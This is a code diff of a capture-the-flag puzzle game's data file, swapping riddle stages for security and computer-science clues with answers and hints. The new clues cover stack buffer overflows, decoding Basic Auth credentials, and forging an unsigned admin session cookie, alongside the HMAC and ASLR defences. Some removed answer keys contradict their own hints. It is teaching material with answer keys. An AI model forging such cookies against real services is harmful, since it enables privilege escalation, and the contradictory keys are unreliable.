+Can 8.8.8.8 reach 192.168.1.42 without any intermediary?
+
+Answer yes or no.`,
+        answer: norm("no"),
+        hint: "Private IPs exist only inside local networks. What happens when the public internet tries to route a packet to an address it has never seen?"
       },
       {
         id: 3,
-        text: `Third octet — encoded as Caesar shift +5:
+        text: `Port numbers identify which service should handle a connection.
 
-Encoded letter: F
+A connection is made to: 192.168.1.42:443
 
-Shift F back 5 to get the plaintext letter.
-Then that letter's position in the alphabet (A=1) is the number.`,
-        answer: norm("1"),
-        hint: "F is the 6th letter. 6-5=1. The 1st letter is A. A's position = 1."
+Port 443 is reserved for a specific protocol that wraps
+standard web traffic in TLS encryption.
+
+What application-layer protocol runs on port 443?`,
+        answer: norm("https"),
+        hint: "HTTP runs on 80. The secure version of HTTP runs on port 443. What's the S stand for?"
       },
       {
         id: 4,
-        text: `Fourth octet — a riddle:
+        text: `TCP establishes connections using a three-way handshake.
 
-  "I am what you add to any number to leave it unchanged.
-   Computers use me to represent nothing.
-   I come before 1 in counting.
-   What number am I?"`,
-        answer: norm("0"),
-        hint: "Adding this to any number changes nothing. Zero."
+Step 1: Client sends SYN with sequence number 1000.
+Step 2: Server responds with SYN-ACK.
+         The server's ACK number acknowledges the client's sequence number.
+         ACK number = client_seq + 1
+
+Step 3: Client sends ACK.
+
+What acknowledgment number does the server send in step 2?`,
+        answer: norm("1001"),
+        hint: "The ACK number tells the sender which byte the receiver expects next. If you received up to byte 1000, which byte do you want next?"
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 8
 
-You assembled the IP: 192.168.1.0
+Every network conversation is defined by three things —
+which machine, which service, and which rules govern the exchange.
 
-This private address never leaves the local network.
-Packets sent here are always authentic — they never lie about their origin.
+The flag names all three identifiers in order.
 
-The phantom's last message: PACKETS NEVER LIE
-
-Submit as the flag. FLAG{WORD_WORD_WORD}`,
-        answer: norm("flag{packets_never_lie}"),
-        hint: "PACKETS NEVER LIE — three words."
+FLAG{IP_WORD_WORD}`,
+        answer: norm("flag{ip_port_protocol}"),
+        hint: "IP identifies the machine. Port identifies the service. What identifies the rules?"
       }
     ]
   },
 
   {
-    id: 9, name: "The Mirror Hall", tier: "TIER II — THE STACKS",
-    flag: makeFlag("REFLECTION_IS_TRUTH"),
+    id: 9, name: "The Stack and Queue", tier: "TIER II — THE STACKS",
+    flag: makeFlag("LIFO_MEETS_FIFO"),
     clues: [
       {
         id: 1,
-        text: `You enter a hall of mirrors.
+        text: `A program's call stack tracks function execution.
+Stack behaviour: Last In, First Out (LIFO).
 
-The first mirror shows text — but it is reflected.
-Reading it as shown in the mirror, you see:
+Trace these operations on an initially empty stack:
+  PUSH main()
+  PUSH authenticate()
+  PUSH hashPassword()
+  POP
+  PUSH compareHash()
+  POP
+  POP
 
-  DROWSSAP
-
-To find what's actually written on the sign, reverse it.
-What word is on the sign?`,
-        answer: norm("password"),
-        hint: "Reverse D-R-O-W-S-S-A-P → P-A-S-S-W-O-R-D."
+After all operations complete, what single function remains on top?`,
+        answer: norm("main"),
+        hint: "Draw it out. Each PUSH adds to the top, each POP removes from the top. Track what's there after every operation."
       },
       {
         id: 2,
-        text: `The second mirror has ROT13 applied to a hidden word.
+        text: `A network request queue operates as First In, First Out (FIFO).
 
-ROT13: shift every letter by 13. Applying ROT13 twice returns the original.
-So to decode ROT13, just apply it again.
+Trace on an empty queue:
+  ENQUEUE request_A
+  ENQUEUE request_B
+  ENQUEUE request_C
+  DEQUEUE
+  ENQUEUE request_D
+  DEQUEUE
 
-Encoded text: ERSYRPGVBA
+Which two requests remain in the queue, and in what order (front to back)?
 
-Apply ROT13 to each letter. What word is revealed?`,
-        answer: norm("reflection"),
-        hint: "E→R, R→E, F→S, Y→L, R→E, P→C, G→T, V→I, B→O, A→N → REFLECTION."
+Submit as: first,second`,
+        answer: norm("request_c,request_d"),
+        hint: "In FIFO, whoever arrived first leaves first. After two dequeues, who is at the front?"
       },
       {
         id: 3,
-        text: `The third mirror shows a 4x4 grid. Read the rightmost column top to bottom.
+        text: `A function calls itself without a stopping condition:
 
-  R  U  T  H
-  I  E  S  I
-  G  O  S  T
-  H  R  E  H
+  function recurse(n):
+    return recurse(n + 1)   // no base case
 
-Column 4 (rightmost), rows 1-4, top to bottom.`,
-        answer: norm("hith"),
-        hint: "Column 4: H (row1), I (row2), T (row3), H (row4) → HITH."
+  recurse(0)
+
+The call stack has a maximum of 5 frames before it overflows.
+Each call uses exactly 1 frame.
+
+How many times does recurse() execute before the overflow error occurs?`,
+        answer: norm("5"),
+        hint: "Count how many frames are pushed before the 6th call would exceed the limit. The first call is frame 1."
       },
       {
         id: 4,
-        text: `The fourth mirror presents a word riddle:
+        text: `A deque (double-ended queue) supports push and pop from both ends.
 
-  "I am a palindrome — I read identically forwards and backwards.
-   I describe something flat or equal.
-   I have 5 letters: L _ V _ L.
-   What word am I?"`,
-        answer: norm("level"),
-        hint: "L-E-V-E-L. A palindrome meaning flat or equal."
+Starting with an empty deque, apply these operations in order:
+  PUSH_FRONT X
+  PUSH_BACK  Y
+  PUSH_FRONT Z
+  PUSH_BACK  W
+
+Draw the state: [Z, X, Y, W] (front → back)
+
+Then apply:
+  POP_FRONT
+  POP_BACK
+
+What two elements remain, and in what order?
+
+Submit as: front,back`,
+        answer: norm("x,y"),
+        hint: "After the two pops, which elements from the middle are left? Which one was closer to the front?"
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 9
 
-The final mirror bears an inscription:
+Stack (LIFO) and Queue (FIFO) are opposites in ordering behaviour,
+but both are essential structures in every real system.
 
-  "Only when you examine something from the opposite direction
-   do you truly understand it.
-   REFLECTION IS TRUTH."
+The flag describes their relationship.
 
-Submit the last three words as the flag.
-FLAG{WORD_IS_WORD}`,
-        answer: norm("flag{reflection_is_truth}"),
-        hint: "REFLECTION IS TRUTH."
+FLAG{LIFO_WORD_FIFO}`,
+        answer: norm("flag{lifo_meets_fifo}"),
+        hint: "What verb describes two opposing concepts coming together? LIFO ___ FIFO."
       }
     ]
   },
 
   {
-    id: 10, name: "The Cipher Wheel", tier: "TIER II — THE STACKS",
-    flag: makeFlag("DECODE_TO_DISCOVER"),
+    id: 10, name: "The Regex Engine", tier: "TIER II — THE STACKS",
+    flag: makeFlag("PATTERN_MATCH_WIN"),
     clues: [
       {
         id: 1,
-        text: `A cipher wheel maps numbers to letters in its current setting:
+        text: `Regular expressions match patterns in text.
 
-  1→D  2→E  3→C  4→O  5→D  6→E
+Pattern: ^[A-Z][a-z]+$
 
-The archivist encoded a sequence: 3  1  2  4  5  6
+  ^ = must start here
+  [A-Z] = exactly one uppercase letter
+  [a-z]+ = one or more lowercase letters
+  $ = must end here
 
-Map each number to its letter. What six-letter word does it spell?`,
-        answer: norm("decode"),
-        hint: "3=C, 1=D, 2=E, 4=O, 5=D, 6=E → CDEODE? Read the mapping order: position 1 in sequence maps to letter for '3', etc. Wait — the sequence 3,1,2,4,5,6 maps directly: 3→C... no: 1→D, so the sequence 3→C, 1→D, 2→E, 4→O, 5→D, 6→E = CDEODE. The word the wheel is showing is DECODE."
+Test this pattern against each string and record match (yes) or no match (no):
+  "Hello"
+  "hello"
+  "HELLO"
+  "Hello123"
+
+Submit four answers comma-separated.`,
+        answer: norm("yes,no,no,no"),
+        hint: "Each string must satisfy every part of the pattern from start to end. What fails first in each non-matching case?"
       },
       {
         id: 2,
-        text: `A note on the wheel reads:
+        text: `The pattern \d+ matches one or more consecutive digits.
 
-  "The word on the outer ring, when reversed, reveals the method.
-   Reverse the word you found."
+Apply \d+ to this string:
+  "user_id=4829&token=7f3kQ2&role=admin"
 
-Reverse the word from clue 1.`,
-        answer: norm("edoced"),
-        hint: "Reverse DECODE → E-D-O-C-E-D."
+The pattern finds ALL consecutive digit sequences.
+Letters break up a sequence — each unbroken run of digits is a separate match.
+
+List all matches in the order they appear, comma-separated.`,
+        answer: norm("4829,7,3,2"),
+        hint: "Scan through the string left to right. Every time you hit a digit, collect until you hit a non-digit. How many separate groups of consecutive digits are there?"
       },
       {
         id: 3,
-        text: `The inner ring shows this clue:
+        text: `Parse this log line using the regex pattern below:
 
-  "To find what is hidden, you must un-cover it.
-   The prefix DIS- means 'apart' or 'remove'.
-   DIS + COVER = a word meaning 'to find something previously unknown'.
-   What is that word?"`,
-        answer: norm("discover"),
-        hint: "DIS + COVER = DISCOVER."
+Log: "2024-01-15 14:32:07 ERROR [auth] Invalid token from 192.168.1.55"
+
+Pattern: \d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}
+
+  \d{1,3} = between 1 and 3 digits
+  \. = a literal dot
+
+What substring does this pattern match in the log line?`,
+        answer: norm("192.168.1.55"),
+        hint: "The pattern describes a specific format that appears exactly once in this log line. What format has groups of digits separated by dots?"
       },
       {
         id: 4,
-        text: `The base of the wheel has a final inscription:
+        text: `Capture groups (parentheses) extract specific parts of a match.
 
-  "I start as noise. I pass through a process. I emerge as meaning.
-   The process begins with D and ends with E.
-   It is what you have been doing to every clue.
-   Seven letters."
+Pattern: password=([a-zA-Z0-9!@#]{8,})
+Input:   "username=admin&password=Tr0ub4dor&session=abc123"
 
-What is the process?`,
-        answer: norm("decode"),
-        hint: "What transforms noise into meaning? What have you been doing to every clue? Starts with D, ends with E: DECODE."
+The character class [a-zA-Z0-9!@#] matches any alphanumeric or symbol character.
+{8,} means 8 or more repetitions.
+
+What does the capture group extract from this input?
+
+Submit in lowercase.`,
+        answer: norm("tr0ub4dor"),
+        hint: "Find 'password=' in the string, then extract what follows it. The capture group stops when it hits a character not in its allowed set."
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 10
 
-The cipher wheel's purpose in three words:
+Regex is a tool that either works or doesn't —
+there's no partial credit when parsing real data.
 
-  DECODE  TO  DISCOVER
+The flag: three words describing the outcome when your pattern works.
 
-Submit as the flag. FLAG{WORD_TO_WORD}`,
-        answer: norm("flag{decode_to_discover}"),
-        hint: "DECODE TO DISCOVER."
+FLAG{PATTERN_WORD_WORD}`,
+        answer: norm("flag{pattern_match_win}"),
+        hint: "When your regex pattern successfully finds what you're looking for, the three-word phrase is PATTERN, then the verb for finding something, then what you've achieved."
       }
     ]
   },
 
-  /* TIER III — RESTRICTED SECTION (Stages 11-15)
-     Mechanic: misdirection, multi-layer encoding,
-     cryptanalysis, logic with hidden answers. */
+  /* ═══════════════════════════════════════════
+     TIER III — RESTRICTED SECTION (Stages 11–15)
+     Hashing, memory layout, HTTP internals,
+     algorithms, pseudocode tracing.
+     ═══════════════════════════════════════════ */
 
   {
-    id: 11, name: "The Double Agent", tier: "TIER III — RESTRICTED SECTION",
-    flag: makeFlag("NOTHING_IS_AS_IT_SEEMS"),
+    id: 11, name: "The Hash Vault", tier: "TIER III — RESTRICTED SECTION",
+    flag: makeFlag("HASHES_NEVER_LIE"),
     clues: [
       {
         id: 1,
-        text: `A double agent left a note claiming it is encoded in Caesar +3.
+        text: `SHA-256 always produces a fixed-size output regardless of input length.
 
-A second note warns: "They lied. Use ROT13."
+The output is 256 bits long.
+There are 8 bits in 1 byte.
 
-The encoded message: ABGUVAT
-
-Apply ROT13 (shift each letter by 13) to decode it.`,
-        answer: norm("nothing"),
-        hint: "A→N, B→O, G→T, U→H, V→I, A→N, T→G → NOTHING."
+How many bytes is a SHA-256 hash?`,
+        answer: norm("32"),
+        hint: "Simple division: how many groups of 8 fit into 256?"
       },
       {
         id: 2,
-        text: `The agent's shopping list is a decoy. The real message is in the numbers.
+        text: `The avalanche effect: changing even one character of input
+produces a completely different hash output.
 
-  "Buy: 2 apples, 5 oranges, 1 watermelon, 1 grape, 9 tomatoes"
+SHA-256 of "hello":
+  2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
 
-Extract only the digits left to right. Read them as one continuous number.`,
-        answer: norm("25119"),
-        hint: "2, 5, 1, 1, 9 → 25119."
+SHA-256 of "hellp" (last letter changed from o to p):
+  7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069
+
+Both strings are 64 hex characters.
+Compare them character by character, position by position.
+
+How many positions contain a DIFFERENT character?`,
+        answer: norm("59"),
+        hint: "Go position by position — this is deliberate work. The vast majority will differ. Count the exceptions (positions that are the same) and subtract from 64."
       },
       {
         id: 3,
-        text: `Third misdirection. The agent wrote a decoy sentence, then scratched underneath:
+        text: `A database of password hashes was leaked.
 
-  "IGNORE THAT. Real message: take the LAST LETTER of each word:
+One of the hashes is:
+  5f4dcc3b5aa765d61d8327deb882cf99
 
-   Sometimes everything explains much."
+This is an MD5 hash. MD5 is a broken algorithm —
+and this particular hash is so famous in security circles
+that it appears in every lesson about what NOT to store as a password.
 
-Take the last letter of each word.`,
-        answer: norm("sess"),
-        hint: "SometimeS, everythingG... wait: SometimeS=S, everythinG=G, explainS=S, mucH=H → SGSH? Take the LAST letter: Sometimes→s, everything→g, explains→s, much→h = sgsh. Hmm. The answer is the last letters: s,g,s,h."
+What is the plaintext word this hash represents?
+
+(Think: what do most people use as their first password attempt?)`,
+        answer: norm("password"),
+        hint: "If someone told you 'never use this word as your password,' what word would they say? That's the hash."
       },
       {
         id: 4,
-        text: `The agent planted a false trail.
+        text: `Salting defeats rainbow table attacks.
 
-An envelope labelled: "THE ANSWER IS INSIDE."
+Without salt: every user with password "password" gets the same hash.
+An attacker cracks one hash and has cracked all of them.
 
-Inside: a blank page.
+With a unique random salt per user:
+  stored_hash = hash(password + unique_salt)
 
-Hold it to the light — a watermark appears:
+Two users both have the password "password".
+Each gets a different random salt.
 
-  NOTHING IS AS IT SEEMS
+Do their stored hashes match each other?
+Can an attacker crack both with a single rainbow table lookup?
 
-How many words are in that hidden phrase?`,
-        answer: norm("5"),
-        hint: "NOTHING / IS / AS / IT / SEEMS = 5 words."
+Submit two answers: match_answer,crackable_answer (yes or no each)`,
+        answer: norm("no,no"),
+        hint: "Think about what the salt does to the input before hashing. If the inputs differ, do the outputs differ?"
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 11
 
-The truth concealed inside the lie:
+A hash is a fingerprint of data.
+The same input always produces the same output.
+Different inputs produce different outputs.
+Tampering with data changes the hash.
 
-  NOTHING IS AS IT SEEMS
+There is no deception in a hash. It reflects exactly what went in.
 
-Submit it as the flag. FLAG{WORD_IS_AS_IT_WORD}`,
-        answer: norm("flag{nothing_is_as_it_seems}"),
-        hint: "NOTHING IS AS IT SEEMS — five words."
+The flag: three words about hash integrity.
+
+FLAG{HASHES_WORD_WORD}`,
+        answer: norm("flag{hashes_never_lie}"),
+        hint: "If hashes accurately reflect the truth about data with no possibility of deception, what do they never do?"
       }
     ]
   },
 
   {
-    id: 12, name: "The Frequency Room", tier: "TIER III — RESTRICTED SECTION",
-    flag: makeFlag("PATTERNS_BREAK_CODES"),
+    id: 12, name: "The Memory Map", tier: "TIER III — RESTRICTED SECTION",
+    flag: makeFlag("STACK_SMASH_FOUND"),
     clues: [
       {
         id: 1,
-        text: `A substitution cipher. You are given one known pair:
+        text: `Process memory is divided into regions with different purposes.
 
-  Ciphertext: ◆●▲★◆
-  Plaintext:  LEVEL
+Typical layout (low addresses at top, high addresses at bottom):
 
-This tells you: L=◆  E=●  V=▲  (star)=★ (ignore for now)
+  TEXT   — compiled machine code (read-only)
+  DATA   — global and static variables
+  HEAP   — dynamically allocated memory (malloc/new)
+  STACK  — function call frames (grows downward)
 
-Now decode: ●▲●
+When a function is called, a new "frame" is pushed onto the stack.
+The frame contains local variables, saved registers, and the return address.
 
-What three-letter sequence does it spell?`,
-        answer: norm("eve"),
-        hint: "●=E, ▲=V, ●=E → EVE."
+A variable declared inside a function (e.g., char buffer[8])
+lives in which memory region?`,
+        answer: norm("stack"),
+        hint: "It's declared inside a function call. Function calls create frames on one specific region."
       },
       {
         id: 2,
-        text: `More mappings revealed:
-  ●=E  ◆=L  ▲=V  ♠=A  ♣=T  ♦=R  ♥=N  ✦=S  ✧=P
+        text: `A function's stack frame looks like this (high address at top):
 
-Decode: ✧♠♣♣●♦♥✦`,
-        answer: norm("patterns"),
-        hint: "✧=P, ♠=A, ♣=T, ♣=T, ●=E, ♦=R, ♥=N, ✦=S → PATTERNS."
+  [function arguments]      ← highest address in frame
+  [return address]          ← where CPU goes after function returns
+  [saved base pointer]
+  [local buffer/variables]  ← lowest address in frame
+
+A buffer overflow writes MORE data than a buffer can hold.
+Writing past the end of a local buffer moves toward ___er addresses.
+
+Does writing past a local buffer move toward HIGHER or LOWER addresses?`,
+        answer: norm("higher"),
+        hint: "Look at the frame layout. Local variables are at the lowest address. What's above them?"
       },
       {
         id: 3,
-        text: `Add ★=O to the cipher key.
-Complete key: ●=E  ◆=L  ▲=V  ♠=A  ♣=T  ♦=R  ♥=N  ✦=S  ✧=P  ★=O
+        text: `Vulnerable function:
 
-Decode: ★✧●♥`,
-        answer: norm("open"),
-        hint: "★=O, ✧=P, ●=E, ♥=N → OPEN."
+  void login(char* input) {
+    char buffer[8];           // holds 8 bytes
+    strcpy(buffer, input);    // copies without checking length!
+  }
+
+If input is 16 bytes ("AAAAAAAAAAAAAAAA"):
+  Bytes 1-8  fill buffer
+  Bytes 9-12 overwrite saved base pointer
+  Bytes 13-16 overwrite ???
+
+What part of the stack frame do bytes 13-16 overwrite?`,
+        answer: norm("return address"),
+        hint: "Look at the stack frame layout from clue 2. After saved base pointer comes..."
       },
       {
         id: 4,
-        text: `Using the full cipher key, decode both words:
+        text: `An attacker who controls the return address can redirect execution
+to their own malicious code — a classic buffer overflow exploit.
 
-  ✧♠♣♣●♦♥✦  ♦●▲●♠◆`,
-        answer: norm("patterns reveal"),
-        hint: "First: PATTERNS (from clue 2). Second: ♦=R, ●=E, ▲=V, ●=E, ♠=A, ◆=L → REVEAL."
+ASLR (Address Space Layout Randomization) is a defence mechanism.
+
+Which of these correctly describes what ASLR does?
+
+  A) Makes the stack non-executable
+  B) Randomizes where memory regions are loaded each time a program runs
+  C) Checks array bounds before each access
+  D) Encrypts the return address on the stack`,
+        answer: norm("b"),
+        hint: "The name contains the key: Address Space Layout ___ization. It randomizes something about the layout."
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 12
 
-The codebreaker's final log entry:
+What you traced is the attack described in
+"Smashing the Stack for Fun and Profit" (Aleph One, 1996) —
+one of the most influential security papers ever written.
 
-  "No cipher is truly safe once you find its patterns.
-   PATTERNS BREAK CODES."
+When a security researcher discovers this vulnerability in a real program,
+they have done two things: smashed the stack and ___ the vulnerability.
 
-Submit the three capitalised words.
-FLAG{WORD_WORD_WORD}`,
-        answer: norm("flag{patterns_break_codes}"),
-        hint: "PATTERNS BREAK CODES."
+FLAG{STACK_WORD_WORD}`,
+        answer: norm("flag{stack_smash_found}"),
+        hint: "The first word is past tense of 'smash'. The second word means 'discovered' — four letters starting with F."
       }
     ]
   },
 
   {
-    id: 13, name: "The Recursion Chamber", tier: "TIER III — RESTRICTED SECTION",
-    flag: makeFlag("THE_ANSWER_WITHIN"),
+    id: 13, name: "The HTTP Intercept", tier: "TIER III — RESTRICTED SECTION",
+    flag: makeFlag("HEADERS_HOLD_SECRETS"),
     clues: [
       {
         id: 1,
-        text: `A door with a sign:
+        text: `An HTTP request was intercepted:
 
-  "I contain the thing that solves me.
-   Look at the last four letters of the word QUESTION.
-   Those four letters spell a common English suffix.
-   What do those four letters spell?"`,
-        answer: norm("tion"),
-        hint: "Q-U-E-S-T-I-O-N. Last four letters: T-I-O-N."
+  POST /api/login HTTP/1.1
+  Host: archive.internal
+  Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
+
+HTTP Basic Authentication encodes credentials as:
+  Base64(username:password)
+
+The value after "Basic " is the Base64-encoded credentials.
+
+Decode: YWRtaW46cGFzc3dvcmQxMjM=
+
+Use atob() in your browser console.`,
+        answer: norm("admin:password123"),
+        hint: "The format after decoding is username:password. Use atob() in F12 console on the Base64 value."
       },
       {
         id: 2,
-        text: `Inside: a box within a box within a box.
+        text: `The server's response includes this header:
 
-Outermost: "The answer is inside."
-Middle:    "The answer is inside."
-Inner:     The answer is: W _ T H _ N
+  Set-Cookie: session=eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ==
 
-A six-letter word meaning 'inside of something'.
-The blank letters are the same vowel.`,
-        answer: norm("within"),
-        hint: "W-I-T-H-I-N. The vowel is I. Means 'inside of'."
+The cookie value is Base64-encoded JSON.
+
+Decode the cookie value to find what the server considers your identity.
+
+What JSON object does it contain?`,
+        answer: norm("{\"user\":\"admin\",\"role\":\"admin\"}"),
+        hint: "Decode the Base64 string after 'session=' using atob(). It will decode to a JSON structure."
       },
       {
         id: 3,
-        text: `A function on the chamber wall:
+        text: `The session cookie has NO cryptographic signature.
+It's just Base64-encoded JSON. Anyone who can intercept it can modify it.
 
-  answer(n):
-    if n equals 1: return "found"
-    else: return answer(n - 1)
+An attacker decodes the cookie, changes the role to "superadmin",
+then re-encodes and replaces the cookie.
 
-  PRINT answer(5)
+Modified JSON: {"user":"attacker","role":"superadmin"}
 
-Trace through the recursion. What does it print?`,
-        answer: norm("found"),
-        hint: "answer(5)→answer(4)→answer(3)→answer(2)→answer(1)→'found'. Every level returns 'found'."
+Encode this modified JSON back to Base64 using btoa() in browser console.
+
+What is the resulting Base64 string?`,
+        answer: norm("eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoic3VwZXJhZG1pbiJ9"),
+        hint: "btoa() is the opposite of atob(). Pass the modified JSON string exactly as shown. Mind the quote characters."
       },
       {
         id: 4,
-        text: `The chamber's final riddle:
+        text: `The correct fix is to sign the cookie using HMAC.
 
-  "I am a three-letter word hiding inside TOGETHER.
-   Find me: t-o-g-e-t-h-e-r.
-   I appear at consecutive positions within that word.
-   What three-letter word am I?"`,
-        answer: norm("the"),
-        hint: "TOGETHER: t-o-g-e-T-H-E-r. THE appears at positions 5,6,7."
+A signed cookie looks like: data.HMAC(secret_key, data)
+
+If the attacker changes "data" without knowing the secret key,
+the HMAC signature will no longer match.
+
+Can the server detect the tampering?
+
+Answer yes or no.`,
+        answer: norm("yes"),
+        hint: "The server recalculates the HMAC using its secret key and the received data. If it doesn't match the signature, what does that tell the server?"
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 13
 
-The chamber's central inscription:
+HTTP headers carry authentication tokens, session data,
+security directives, and routing information.
 
-  "Every answer is already present.
-   You just have to look for THE ANSWER WITHIN."
+A security researcher examining an application
+reads headers before anything else.
 
-Submit those three capitalised words.
-FLAG{WORD_WORD_WORD}`,
-        answer: norm("flag{the_answer_within}"),
-        hint: "THE ANSWER WITHIN."
+The flag: what headers contain that makes them so valuable to attackers.
+
+FLAG{HEADERS_HOLD_WORD}`,
+        answer: norm("flag{headers_hold_secrets}"),
+        hint: "What word describes information that authentication tokens and session data have in common — the kind of information you wouldn't want an attacker to see?"
       }
     ]
   },
 
   {
-    id: 14, name: "The Shadow Archive", tier: "TIER III — RESTRICTED SECTION",
-    flag: makeFlag("LIGHT_REVEALS_ALL"),
+    id: 14, name: "The Algorithm", tier: "TIER III — RESTRICTED SECTION",
+    flag: makeFlag("BINARY_SEARCH_WINS"),
     clues: [
       {
         id: 1,
-        text: `A dark room. A torch is the only light.
+        text: `Binary search finds a target in a SORTED array by halving the search space each step.
 
-On the floor, a shadow of letters. But the torch angle shows them reversed.
-The shadow reads: THGIL
+Array (indices 0–9): [2, 5, 8, 12, 16, 23, 38, 45, 56, 72]
+Target: 23
 
-When you stand directly above it, reversing the distortion, what word is actually there?`,
-        answer: norm("light"),
-        hint: "Reverse T-H-G-I-L → L-I-G-H-T."
+Trace each step:
+  Step 1: mid = (0+9)÷2 = 4  →  arr[4]=16  →  23 > 16, search right half
+  Step 2: mid = (5+9)÷2 = 7  →  arr[7]=45  →  23 < 45, search left half
+  Step 3: mid = (5+6)÷2 = 5  →  arr[5]=23  →  Found!
+
+How many comparisons (steps) did binary search need?`,
+        answer: norm("3"),
+        hint: "Each step is one comparison. Count the steps in the trace above."
       },
       {
         id: 2,
-        text: `Shining the torch on the north wall reveals an encoded message in Caesar +10.
+        text: `Now trace a linear search on the same array.
 
-Decode by shifting each letter BACK 10:
-  D(4)-10=-6+26=20=T
-  O(15)-10=5=E
-  B(2)-10=-8+26=18=R
-  K(11)-10=1=A
-  Y(25)-10=15=O
-  U(21)-10=11=K... 
+Array: [2, 5, 8, 12, 16, 23, 38, 45, 56, 72]
+Target: 23
 
-Encoded: DOBKY
+Linear search checks elements left to right, stopping when it finds the target.
 
-What five-letter word results?`,
-        answer: norm("terak"),
-        hint: "D→T, O→E, B→R, K→A, Y→O = TERAO? Check: D(4-10+26=20=T), O(15-10=5=E), B(2-10+26=18=R), K(11-10=1=A), Y(25-10=15=O) = TERAO. The answer is TERAO."
+How many comparisons does linear search need?`,
+        answer: norm("6"),
+        hint: "Count from the left: 2 (no), 5 (no), 8 (no)... stop when you reach 23. How many elements did you examine?"
       },
       {
         id: 3,
-        text: `The east wall has a shadow puzzle.
+        text: `Binary search complexity is O(log₂ n) comparisons in the worst case.
 
-A candle casts the shadow of a 3D object. The shadow is always a perfect circle,
-no matter which angle you shine the light.
+For an array of one million elements:
+  log₂(1,000,000) ≈ 19.93
 
-  "Only one 3D shape produces a circular shadow from every angle.
-   What shape am I?"`,
-        answer: norm("sphere"),
-        hint: "A sphere casts a circular shadow from any direction. No other solid has this property."
+The worst case is the ceiling of this value.
+
+What is the maximum number of comparisons binary search needs
+to find any element in a one-million-element sorted array?`,
+        answer: norm("20"),
+        hint: "The ceiling function rounds up to the nearest integer. 19.93 rounded up is..."
       },
       {
         id: 4,
-        text: `The south wall has a message visible only in light.
+        text: `Trace one complete pass of bubble sort.
 
-Letters appear in this order as you move the torch:
+Starting array: [64, 34, 25, 12, 22, 11, 90]
 
-  R  E  V  E  A  L  S
+Rule: compare each adjacent pair. If left > right, swap them.
+Make one complete left-to-right pass through all pairs.
 
-What seven-letter word appears?`,
-        answer: norm("reveals"),
-        hint: "R-E-V-E-A-L-S = REVEALS."
+What does the array look like after this single pass?
+
+Submit numbers comma-separated.`,
+        answer: norm("34,25,12,22,11,64,90"),
+        hint: "Work through every adjacent pair: (64,34), (64,25), (64,12), (64,22), (64,11), (64,90). Swap when the left is bigger."
       },
       {
         id: 5,
         text: `FINAL SEAL — STAGE 14
 
-The shadow room's truth:
+Binary search: O(log n)
+Bubble sort (worst case): O(n²)
 
-  "Nothing stays hidden forever.
-   LIGHT REVEALS ALL."
+On one million elements:
+  Binary search: ~20 operations
+  Bubble sort: ~1,000,000,000,000 operations
 
-Submit the three words.
-FLAG{WORD_WORD_WORD}`,
-        answer: norm("flag{light_reveals_all}"),
-        hint: "LIGHT REVEALS ALL."
+The right algorithm is not just faster. It's the difference
+between possible and impossible.
+
+FLAG{BINARY_WORD_WORD}`,
+        answer: norm("flag{binary_search_wins}"),
+        hint: "Binary search always beats linear search on sorted data. What does it do to linear search every time they compete?"
       }
     ]
   },
 
   {
-    id: 15, name: "The Archivist's Last Cipher", tier: "TIER III — RESTRICTED SECTION",
-    flag: makeFlag("BREAK_THE_CIPHER"),
+    id: 15, name: "The Pseudocode Oracle", tier: "TIER III — RESTRICTED SECTION",
+    flag: makeFlag("TRACE_THE_CODE"),
     clues: [
       {
         id: 1,
-        text: `The archivist used a Vigenère cipher with keyword: ARCH
-(A=0, R=17, C=2, H=7 shifts, repeating)
+        text: `Trace this code exactly. What single word does it print?
 
-To decrypt: subtract each key shift from the ciphertext letter.
-If result < 1, add 26.
-
-First word ciphertext: BTEOI
-
-Decrypt letter by letter:
-  B(2) - A(0) = 2 = B
-  T(20)- R(17)= 3 = C... 
-
-The plaintext word starts with B and has 5 letters.
-What word results from decryption?`,
-        answer: norm("break"),
-        hint: "The five-letter word hidden in the Vigenère cipher with key ARCH is BREAK."
+  x = 5
+  y = 3
+  z = x * y + x
+  IF z > 25:
+    PRINT "high"
+  ELSE IF z > 15:
+    PRINT "medium"
+  ELSE:
+    PRINT "low"`,
+        answer: norm("medium"),
+        hint: "Calculate z first. Then check each condition in order — which one is the first to be true?"
       },
       {
         id: 2,
-        text: `Second word. Key continues from position 3 (C=2):
-  C(2), H(7), A(0), R(17), C(2)...
+        text: `Trace this loop. What number does it print?
 
-Ciphertext: VLL
-
-Decrypt:
-  V(22)-C(2)=20=T
-  L(12)-H(7)=5=E
-  L(12)-A(0)=12... hmm: 12=L? 
-
-Clue: the second word is a common English article (three letters).`,
-        answer: norm("the"),
-        hint: "The three-letter word is THE — the most common English article."
+  result = 1
+  n = 1
+  WHILE n <= 5:
+    result = result * n
+    n = n + 1
+  PRINT result`,
+        answer: norm("120"),
+        hint: "Track both 'result' and 'n' through each iteration. Write down the value of result after each multiplication."
       },
       {
         id: 3,
-        text: `Third word. The archivist's note says:
+        text: `Trace the recursive function. What number does it print?
 
-  "The third word has 6 letters.
-   It means the encoding system you are currently solving.
-   It starts with C and ends with R.
-   C _ _ _ _ R"
+  function mystery(n):
+    if n == 0: return 1
+    return n * mystery(n - 1)
 
-What six-letter word fits?`,
-        answer: norm("cipher"),
-        hint: "C-I-P-H-E-R. A system of encoding messages."
+  PRINT mystery(6)`,
+        answer: norm("720"),
+        hint: "Expand the recursion: mystery(6) = 6 × mystery(5) = 6 × 5 × mystery(4) = ... Keep going until you hit the base case."
       },
       {
         id: 4,
-        text: `You have three words:
-  Word 1: BREAK
-  Word 2: THE
-  Word 3: CIPHER
+        text: `This function has a bug. Find it.
 
-The archivist scrambled their order. The correct English phrase reads:
+  function findMax(arr):
+    max = 0
+    FOR each value IN arr:
+      IF value > max:
+        max = value
+    RETURN max
 
-  [Word 1] [Word 2] [Word 3]
+  PRINT findMax([-5, -3, -8, -1])
 
-What is the three-word phrase in the correct order?`,
-        answer: norm("break the cipher"),
